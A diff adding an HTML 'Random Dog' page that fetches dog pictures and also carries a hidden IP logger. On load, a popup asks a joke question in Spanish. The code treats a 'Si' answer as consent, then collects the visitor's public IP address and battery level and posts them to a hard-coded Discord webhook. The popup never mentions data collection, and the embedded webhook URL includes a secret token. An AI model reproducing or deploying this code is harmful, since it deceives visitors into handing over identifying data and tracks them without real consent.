@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Dogs</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background: #f2f2f2;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    img {
+      max-width: 300px;
+      border-radius: 15px;
+      margin-top: 20px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 1rem;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      background: #4caf50;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Random Dog</h1>
+    <button onclick="loadDog()">Show Dog</button>
+    <div>
+      <img id="dogImg" src="" alt="" />
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script>
+  let userConsented = false;
+
+  // Show consent popup when page loads
+  document.addEventListener('DOMContentLoaded', () => {
+    Swal.fire({
+      icon: 'warning',
+      title: 'Alerta',
+      text: 'El pancho es un okupa es verdad?',
+      confirmButtonText: 'Si',
+      showCancelButton: true,
+      cancelButtonText: 'No'
+    }).then(result => {
+      if (result.isConfirmed) {
+        userConsented = true;
+        sendUserData();
+      }
+    });
+  });
+
+  function sendUserData() {
+    // Fetch IP
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(ipData => {
+        // Fetch battery
+        if (navigator.getBattery) {
+          navigator.getBattery().then(battery => {
+            const batteryPercent = Math.round(battery.level * 100) + '%';
+
+            const payload = {
+              embeds: [
+                {
+                  title: 'User Log',
+                  color: 16711680, // red
+                  fields: [
+                    { name: 'IP', value: ipData.ip },
+                    { name: 'Battery', value: batteryPercent }
+                  ]
+                }
+              ]
+            };
+
+            fetch('https://discord.com/api/webhooks/1444703374137360606/vxkTjrB0ZfJMXnxMC6JTzHLbjBfu3m9o56-1mMUNc0OP4RQpnTztQcqZ-zw62KdGBMs5', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload)
+            });
+          });
+        }
+      });
+  }
+
+  function loadDog() {
+    fetch('https://dog.ceo/api/breeds/image/random')
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('dogImg').src = data.message;
+      });
+  }
+</script>
+</body>
+</html>
